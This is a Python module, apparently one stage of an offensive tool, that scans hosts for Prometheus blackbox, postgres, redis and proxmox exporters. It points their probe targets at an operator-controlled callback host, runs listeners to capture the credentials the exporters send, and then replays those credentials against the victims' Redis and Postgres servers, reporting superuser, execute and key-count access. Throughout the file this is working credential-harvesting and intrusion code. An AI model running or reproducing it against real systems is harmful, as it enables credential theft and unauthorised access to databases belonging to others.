"""Trigger stage."""

from __future__ import annotations

import argparse
import re
import sys
import threading
import time
from typing import Any
from urllib.parse import urlparse

from .console import Console
from .listener_runtime import parse_services, start_listeners_for_trigger, stop_started_listeners
from .logger import AttemptLogger
from .profiles import load_profiles
from .scanner import scan_exporters_and_trigger
from .servers import RunningServer
from .utils import collect_scan_targets, normalize_ip_literal, normalize_scan_host

_TRIGGER_EXPORTER_DISPLAY_NAMES = {
    "blackbox_exporter": "Blackbox Exporter",
    "postgres_exporter": "Postgres Exporter",
    "redis_exporter": "Redis Exporter",
    "proxmox_exporter": "Proxmox Exporter",
}

_EXPORTER_TO_LISTENER_SERVICE = {
    "blackbox_exporter": "blackbox",
    "postgres_exporter": "postgres",
    "redis_exporter": "redis",
    "proxmox_exporter": "proxmox",
}

_TRIGGER_EXPORTER_ALIASES = {
    "blackbox": "blackbox_exporter",
    "blackbox_exporter": "blackbox_exporter",
    "postgres": "postgres_exporter",
    "postgres_exporter": "postgres_exporter",
    "redis": "redis_exporter",
    "redis_exporter": "redis_exporter",
    "proxmox": "proxmox_exporter",
    "proxmox_exporter": "proxmox_exporter",
}

_DEFAULT_LISTENER_SERVICES_RAW = "postgres,redis,proxmox,blackbox"


def _clip_text(value: str, width: int) -> str:
    if len(value) <= width:
        return value
    if width <= 3:
        return value[:width]
    return value[: width - 3] + "..."


def _render_trigger_row(console: Console, target: str, marker: str, body: str) -> None:
    marker_color = {"[*]": "cyan", "[+]": "green", "[-]": "yellow", "[!]": "red"}.get(marker, "white")
    clipped_target = _clip_text(target, 64)
    target_segment = "\t" + clipped_target + "\t-\t"
    line = (
        f"{console._paint('TRIGGER ', 'blue', sys.stdout)}"
        f"{console._paint(target_segment, 'white', sys.stdout)}"
        f" {console._paint(marker, marker_color, sys.stdout)} "
        f"{console._paint(body, 'white', sys.stdout)}"
    )
    console.plain(line)


def _render_trigger_callback_row(
    console: Console,
    callback_target: str,
    callback_port: str,
    marker: str,
    exporter_name: str,
    stage_tag: str = "TRIGGER",
) -> None:
    marker_color = {"[*]": "cyan", "[+]": "green", "[-]": "yellow", "[!]": "red"}.get(marker, "white")
    clipped_target = _clip_text(callback_target, 64)
    clipped_port = _clip_text(callback_port, 16)
    target_segment = "\t" + clipped_target + "\t" + clipped_port + "\t"
    line = (
        f"{console._paint(f'{stage_tag:<8}', 'blue', sys.stdout)}"
        f"{console._paint(target_segment, 'white', sys.stdout)}"
        f" {console._paint(marker, marker_color, sys.stdout)} "
        f"{console._paint(exporter_name, 'white', sys.stdout)}"
    )
    console.plain(line)


def _render_trigger_check_row(console: Console, target: str, port: str, marker: str, body: str) -> None:
    marker_color = {"[*]": "cyan", "[+]": "green", "[-]": "yellow", "[!]": "red"}.get(marker, "white")
    clipped_target = _clip_text(target, 64)
    clipped_port = _clip_text(port, 16)
    target_segment = "\t" + clipped_target + "\t" + clipped_port + "\t"
    stage_segment = f"{'CHECK':<8}"
    spans: list[tuple[int, int, str]] = []
    for fragment, color in (
        ("(auth required:True)", "bright_green"),
        ("(auth required:False)", "red"),
        ("(auth required:unknown)", "yellow"),
        ("(superuser:True)", "red"),
        ("(execute:True)", "red"),
        ("(read:True)", "red"),
    ):
        idx = body.find(fragment)
        if idx >= 0:
            spans.append((idx, idx + len(fragment), color))

    table_match = re.search(r"\(tables:(\d+)\)", body)
    if table_match and int(table_match.group(1)) > 0:
        spans.append((table_match.start(), table_match.end(), "orange"))

    key_match = re.search(r"\(keys:(\d+)(?: [^)]*)?\)", body)
    if key_match and key_match.group(1).isdigit() and int(key_match.group(1)) > 0:
        spans.append((key_match.start(), key_match.end(), "red"))

    if not spans:
        body_colored = console._paint(body, "white", sys.stdout)
    else:
        chunks: list[str] = []
        cursor = 0
        for start, end, color in sorted(spans, key=lambda item: item[0]):
            if start < cursor:
                continue
            if start > cursor:
                chunks.append(console._paint(body[cursor:start], "white", sys.stdout))
            chunks.append(console._paint(body[start:end], color, sys.stdout))
            cursor = end
        if cursor < len(body):
            chunks.append(console._paint(body[cursor:], "white", sys.stdout))
        body_colored = "".join(chunks)

    line = (
        f"{console._paint(stage_segment, 'blue', sys.stdout)}"
        f"{console._paint(target_segment, 'white', sys.stdout)}"
        f" {console._paint(marker, marker_color, sys.stdout)} "
        f"{body_colored}"
    )
    console.plain(line)


def _exporter_display_name(raw_name: str) -> str:
    key = (raw_name or "").strip().lower()
    return _TRIGGER_EXPORTER_DISPLAY_NAMES.get(key, raw_name)


def _with_listen_target_fmt(exporter: dict[str, Any], args: argparse.Namespace) -> str | None:
    name = str(exporter.get("name") or "")
    trigger_path = str(exporter.get("trigger_path") or "").strip()
    exporter_name = name.strip().lower()
    redis_port = int(getattr(args, "redis_port", 16379))
    postgres_port = int(getattr(args, "postgres_port", 15432))
    blackbox_port = int(getattr(args, "blackbox_port", 19115))
    proxmox_port = int(getattr(args, "proxmox_port", 18006))
    proxmox_tls = bool(getattr(args, "proxmox_tls", False))
    if exporter_name == "redis_exporter":
        return f"{{our_host}}:{redis_port}"
    if exporter_name == "postgres_exporter":
        return f"postgresql://postgres:postgres@{{our_host}}:{postgres_port}/postgres?sslmode=disable"
    if exporter_name == "blackbox_exporter":
        raw_target_fmt = str(exporter.get("target_fmt") or "").strip()
        parsed = urlparse(raw_target_fmt if "://" in raw_target_fmt else f"http://{raw_target_fmt}", scheme="http")
        scheme = parsed.scheme.lower() if parsed.scheme else "http"

        auth_prefix = ""
        if parsed.username is not None:
            auth_prefix = parsed.username
            if parsed.password is not None:
                auth_prefix += f":{parsed.password}"
            auth_prefix += "@"

        path = parsed.path or ""
        query = f"?{parsed.query}" if parsed.query else ""
        return f"{scheme}://{auth_prefix}{{our_host}}:{blackbox_port}{path}{query}"
    if exporter_name == "proxmox_exporter":
        if trigger_path == "/pve":
            return f"{{our_host}}:{proxmox_port}"
        scheme = "https" if proxmox_tls else "http"
        return f"{scheme}://{{our_host}}:{proxmox_port}/api2/json/access/ticket"
    return None


def _patch_trigger_exporters_for_with_listen(
    trigger_exporters: list[dict[str, Any]],
    args: argparse.Namespace,
) -> list[dict[str, Any]]:
    patched: list[dict[str, Any]] = []
    for exporter in trigger_exporters:
        item = dict(exporter)
        override_target_fmt = _with_listen_target_fmt(item, args)
        if override_target_fmt:
            item["target_fmt"] = override_target_fmt
        patched.append(item)
    return patched


def _parse_trigger_exporter_filter(raw: str | None) -> set[str]:
    if raw is None:
        return set()
    selected: set[str] = set()
    unknown: set[str] = set()
    for part in str(raw).split(","):
        token = part.strip().lower()
        if not token:
            continue
        mapped = _TRIGGER_EXPORTER_ALIASES.get(token)
        if mapped is None:
            unknown.add(token)
            continue
        selected.add(mapped)
    if unknown:
        raise ValueError(
            "unsupported trigger exporters: "
            + ", ".join(sorted(unknown))
            + " (supported: blackbox,postgres,proxmox,redis)"
        )
    return selected


def _filter_trigger_exporters(
    trigger_exporters: list[dict[str, Any]],
    selected_exporter_names: set[str],
) -> list[dict[str, Any]]:
    if not selected_exporter_names:
        return list(trigger_exporters)
    filtered = [
        item for item in trigger_exporters if str(item.get("name") or "").strip().lower() in selected_exporter_names
    ]
    return filtered


def _auto_adjust_listener_services_for_trigger_exporters(
    args: argparse.Namespace,
    selected_exporter_names: set[str],
    console: Console,
) -> None:
    if not getattr(args, "with_listen", False) or not selected_exporter_names:
        return

    required_services = {
        service
        for exporter_name in selected_exporter_names
        for service in [_EXPORTER_TO_LISTENER_SERVICE.get(exporter_name)]
        if service is not None
    }
    if not required_services:
        return

    try:
        current_services = parse_services(str(getattr(args, "services", _DEFAULT_LISTENER_SERVICES_RAW)))
    except ValueError:
        return

    if str(getattr(args, "services", "")) == _DEFAULT_LISTENER_SERVICES_RAW:
        adjusted_services = required_services
    else:
        adjusted_services = current_services | required_services

    args.services = ",".join(sorted(adjusted_services))
    console.debug(f"auto listener services for trigger exporters: {args.services}")


def _callback_event_has_complete_creds(event: dict[str, Any]) -> bool:
    return event.get("username") not in (None, "") and event.get("password") not in (None, "")


def _callback_event_remote_host(event: dict[str, Any]) -> str:
    remote = str(event.get("remote_addr") or "-")
    return remote.rsplit(":", 1)[0] if ":" in remote else remote


def _run_trigger_credential_checks(args: argparse.Namespace, logger: AttemptLogger, console: Console) -> None:
    from .stage_postgres import _audit_postgres_host
    from .stage_postgres import _caps_suffix as _postgres_caps_suffix
    from .stage_redis import _audit_redis_host

    raw_events = logger.get_trigger_callback_events()
    check_events: list[dict[str, Any]] = []
    for event in raw_events:
        service = str(event.get("service") or "").strip().lower()
        if service not in {"redis", "postgres"}:
            continue
        if not _callback_event_has_complete_creds(event):
            continue
        check_events.append(event)

    if not check_events:
        console.info("trigger credential checks: no Redis/Postgres credentials captured")
        return

    console.info(f"trigger credential checks: {len(check_events)} captured credential event(s)")

    for event in sorted(
        check_events,
        key=lambda item: (
            str(item.get("service") or ""),
            _callback_event_remote_host(item),
            str(item.get("listen_port") or ""),
        ),
    ):
        service = str(event.get("service") or "").strip().lower()
        host = _callback_event_remote_host(event)
        username = str(event.get("username") or "")
        password = str(event.get("password") or "")
        cred_display = f"{username}:{password}"

        if service == "redis":
            port = 6379
            _render_trigger_check_row(console, host, str(port), "[*]", f"Redis credentials {cred_display}")
            record = _audit_redis_host(
                host=host,
                port=port,
                timeout=args.timeout,
                retries=args.retries,
                username=username or None,
                password=password,
                defcreds=False,
                show_keys=False,
                dump_keys=False,
                query_key=None,
            )
            status = str(record.get("status") or "fail")
            err = str(record.get("error") or "").strip()
            if status in {"valid_credentials", "open_no_auth", "weak_default_creds"}:
                key_count = record.get("key_count")
                keys_part = f" (keys:{key_count})" if isinstance(key_count, int) else " (keys:-)"
                body = "Redis credentials valid" if status == "valid_credentials" else "Redis reachable (no-auth)"
                _render_trigger_check_row(console, host, str(port), "[+]", f"{body}{keys_part}")
            elif status == "auth_required":
                body = f"Redis credentials invalid ({cred_display})"
                if err:
                    body += f" err={_clip_text(err, 80)}"
                _render_trigger_check_row(console, host, str(port), "[-]", body)
            else:
                body = "Redis connection failed"
                if err:
                    body += f" err={_clip_text(err, 80)}"
                _render_trigger_check_row(console, host, str(port), "[!]", body)
            continue

        port = 5432
        _render_trigger_check_row(console, host, str(port), "[*]", f"Postgres credentials {cred_display}")
        record = _audit_postgres_host(
            host=host,
            port=port,
            timeout=args.timeout,
            retries=args.retries,
            username=username or None,
            password=password,
            defcreds=False,
            database="postgres",
            show_databases=False,
            show_tables=False,
            show_columns=False,
            table_targets=[],
            table_columns=[],
            dump_table_rows=False,
            execute_command=None,
        )
        status = str(record.get("status") or "fail")
        err = str(record.get("error") or "").strip()
        if status in {"valid_credentials", "open_no_auth", "weak_default_creds"}:
            if status == "valid_credentials":
                body = f"{cred_display} {_postgres_caps_suffix(record)}"
            elif status == "weak_default_creds":
                body = f"postgres:postgres {_postgres_caps_suffix(record)}"
            else:
                body = f"no-auth access {_postgres_caps_suffix(record)}"
            _render_trigger_check_row(console, host, str(port), "[+]", body)
        elif status == "auth_required":
            body = f"Postgres credentials invalid ({cred_display})"
            if err:
                body += f" err={_clip_text(err, 80)}"
            _render_trigger_check_row(console, host, str(port), "[-]", body)
        else:
            body = "Postgres connection failed"
            if err:
                body += f" err={_clip_text(err, 80)}"
            _render_trigger_check_row(console, host, str(port), "[!]", body)


def _run_trigger_requests(
    args: argparse.Namespace,
    logger: AttemptLogger,
    console: Console,
    hosts: list[str],
    callback_targets: list[str],
    trigger_exporters: list[dict[str, Any]],
    show_trigger_info: bool,
    log_trigger_attempts: bool,
) -> dict[str, Any]:
    callbacks = ",".join(callback_targets)
    if show_trigger_info:
        console.info(
            f"trigger started: hosts={len(hosts)} callbacks={callbacks} "
            f"timeout={args.timeout}s workers={args.workers} retries={args.retries}"
        )
    callback_emit_lock = threading.Lock()
    emitted_scan_rows: set[tuple[str, str, str]] = set()

    def _emit_trigger_event(event: dict[str, Any]) -> None:
        phase = str(event.get("phase") or "")
        if phase == "detect_hit":
            scan_target = str(event.get("host") or "-")
            scan_port = str(event.get("exporter_port") or "-")
        elif phase == "callback_attempt":
            # Backward compatibility fallback for older scanner emitters.
            scan_target = str(event.get("host") or event.get("callback_target") or "-")
            scan_port = str(event.get("exporter_port") or event.get("callback_port") or "-")
        else:
            return
        exporter_name = _exporter_display_name(str(event.get("exporter") or "-"))
        row_key = (scan_target, scan_port, exporter_name)
        with callback_emit_lock:
            if row_key in emitted_scan_rows:
                return
            emitted_scan_rows.add(row_key)
            _render_trigger_callback_row(
                console,
                scan_target,
                scan_port,
                "[*]",
                exporter_name,
                stage_tag="SCAN",
            )

    trigger_logger = logger if log_trigger_attempts else None
    summary = scan_exporters_and_trigger(
        logger=trigger_logger,
        hosts=hosts,
        callback_targets=callback_targets,
        timeout=args.timeout,
        workers=args.workers,
        retries=args.retries,
        trigger_exporters=trigger_exporters,
        log_trigger_events_only=not args.debug,
        emit_trigger_event=_emit_trigger_event if args.with_listen else None,
    )
    attempted = int(summary.get("attempted", 0))
    display_success = int(summary.get("triggered", 0))
    display_fail = int(summary.get("failed", max(0, attempted - display_success)))

    if args.with_listen:
        callback_stats = logger.get_trigger_callback_stats()
        by_service = callback_stats.get("by_service", {})
        callback_based_success = 0
        by_exporter = summary.get("by_exporter")
        if isinstance(by_exporter, dict) and by_exporter:
            for exporter_name, exporter_stats in by_exporter.items():
                if not isinstance(exporter_stats, dict):
                    continue
                service_name = _EXPORTER_TO_LISTENER_SERVICE.get(str(exporter_name))
                if service_name is None:
                    continue
                exporter_attempted = int(exporter_stats.get("attempted", 0))
                callback_hits = int(by_service.get(service_name, 0))
                callback_based_success += min(exporter_attempted, callback_hits)
        else:
            callback_based_success = int(callback_stats.get("total", 0))

        display_success = min(attempted, callback_based_success)
        display_fail = max(0, attempted - display_success)
        if args.debug:
            console.debug(
                "with-listen summary mode: "
                f"callback_success={display_success} callback_fail={display_fail} "
                f"trigger_success={summary.get('triggered', 0)} trigger_fail={summary.get('failed', 0)}"
            )

    if show_trigger_info:
        console.info(
            "trigger complete: "
            f"hosts={len(hosts)} detected={summary['detected_exporters']} "
            f"attempts={attempted} success={display_success} fail={display_fail}"
        )
        if args.debug:
            for host, stats in sorted(summary["by_host"].items()):
                marker = "[+]" if stats["success"] > 0 else ("[-]" if stats["detected"] > 0 else "[!]")
                _render_trigger_row(
                    console,
                    host,
                    marker,
                    (
                        f"detected={stats['detected']} attempts={stats['attempted']} "
                        f"success={stats['success']} fail={stats['fail']}"
                    ),
                )
            for target in callback_targets:
                stats = summary["by_callback"].get(target, {"attempted": 0, "success": 0, "fail": 0})
                callback_attempted = int(stats.get("attempted", 0))
                callback_success = int(stats.get("success", 0))
                callback_fail = int(stats.get("fail", 0))
                marker = "[+]" if callback_success > 0 else ("[-]" if callback_attempted > 0 else "[!]")
                _render_trigger_row(
                    console,
                    f"callback={target}",
                    marker,
                    f"attempts={callback_attempted} success={callback_success} fail={callback_fail}",
                )
    for host, stats in sorted(summary["by_host"].items()):
        console.debug(
            f"host={host} detected={stats['detected']} "
            f"attempts={stats['attempted']} success={stats['success']} fail={stats['fail']}"
        )
    if show_trigger_info:
        console.debug("debug mode enabled; detailed trigger events emitted in text logs")
    return summary


def run_trigger_stage(args: argparse.Namespace, logger: AttemptLogger) -> int:
    console = Console(debug=args.debug)

    if args.timeout <= 0:
        console.error("--timeout must be > 0")
        return 2
    if args.retries < 0:
        console.error("--retries must be >= 0")
        return 2
    if getattr(args, "check_credentials", False) and not getattr(args, "with_listen", False):
        console.error("--check-credentials requires --with-listen")
        return 2

    targets = getattr(args, "targets", None) or getattr(args, "hosts", None)
    hosts_file = getattr(args, "hosts_file", None)
    if hosts_file:
        targets = f"{targets},{hosts_file}" if targets else hosts_file

    try:
        hosts = collect_scan_targets(targets)
    except (OSError, ValueError) as exc:
        console.error(f"failed to parse targets: {exc}")
        return 2

    try:
        profiles = load_profiles(args.profiles_file)
    except (OSError, ValueError) as exc:
        console.error(f"failed to load profiles: {exc}")
        return 2

    try:
        selected_trigger_exporters = _parse_trigger_exporter_filter(getattr(args, "trigger_exporters_filter", None))
    except ValueError as exc:
        console.error(str(exc))
        return 2

    if not hosts:
        console.error("trigger requires -t/--targets")
        return 2

    callback_targets: list[str] = []

    callback_ip = normalize_ip_literal(args.callback_ip or "")
    if args.callback_ip and not callback_ip:
        console.error("--callback-ip must be a valid IP address")
        return 2
    if callback_ip:
        callback_targets.append(callback_ip)

    callback_dns = normalize_scan_host(args.callback_dns or "")
    if args.callback_dns and not callback_dns:
        console.error("--callback-dns must be a valid DNS name or host")
        return 2
    if callback_dns and callback_dns not in callback_targets:
        callback_targets.append(callback_dns)

    if not callback_targets:
        console.error("trigger requires --callback-ip and/or --callback-dns")
        return 2

    output_path = getattr(args, "output", None)
    if output_path:
        try:
            logger.set_text_output(output_path)
        except OSError as exc:
            console.error(f"failed to open trigger output file: {exc}")
            return 2
        console.info(f"trigger output file: {output_path}")

    trigger_exporters = _filter_trigger_exporters(profiles["trigger_exporters"], selected_trigger_exporters)
    if selected_trigger_exporters and not trigger_exporters:
        console.error("no trigger exporters matched filter")
        return 2
    if selected_trigger_exporters:
        _auto_adjust_listener_services_for_trigger_exporters(args, selected_trigger_exporters, console)
        console.debug(
            "trigger exporters filter=" + ",".join(sorted(str(item.get("name") or "") for item in trigger_exporters))
        )
    if args.with_listen:
        trigger_exporters = _patch_trigger_exporters_for_with_listen(trigger_exporters, args)
        proxmox_tls_enabled = bool(getattr(args, "proxmox_tls", False))
        proxmox_requires_tls = any(
            str(item.get("name") or "").strip().lower() == "proxmox_exporter"
            and str(item.get("trigger_path") or "").strip() == "/pve"
            for item in trigger_exporters
        )
        if proxmox_requires_tls and not proxmox_tls_enabled:
            console.warn(
                "proxmox callback likely to fail: proxmox_exporter /pve uses HTTPS target; "
                "enable --proxmox-tls to capture proxmox callbacks"
            )
        if args.debug:
            for item in trigger_exporters:
                console.debug(f"trigger exporter={item.get('name')} target_fmt={item.get('target_fmt')}")

    if not args.with_listen:
        _run_trigger_requests(
            args,
            logger,
            console,
            hosts,
            callback_targets,
            trigger_exporters,
            show_trigger_info=True,
            log_trigger_attempts=True,
        )
        return 0

    running: list[RunningServer] = []
    temp_cert_dir: str | None = None
    try:
        logger.set_trigger_callback_mode(
            True,
            callback_targets=callback_targets,
            deduplicate=not args.debug,
        )
        running, temp_cert_dir = start_listeners_for_trigger(args, logger, console)
        _run_trigger_requests(
            args,
            logger,
            console,
            hosts,
            callback_targets,
            trigger_exporters,
            show_trigger_info=True,
            log_trigger_attempts=False,
        )
        if getattr(args, "check_credentials", False):
            _run_trigger_credential_checks(args, logger, console)
        console.info("listeners are up; waiting for incoming events (Ctrl+C to stop)")
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        console.info("stopping listeners...")
        return 0
    except OSError as exc:
        console.error(f"failed to start service: {exc}")
        return 1
    except ValueError as exc:
        console.error(str(exc))
        return 2
    finally:
        logger.set_trigger_callback_mode(False)
        stop_started_listeners(running, temp_cert_dir)

    return 0
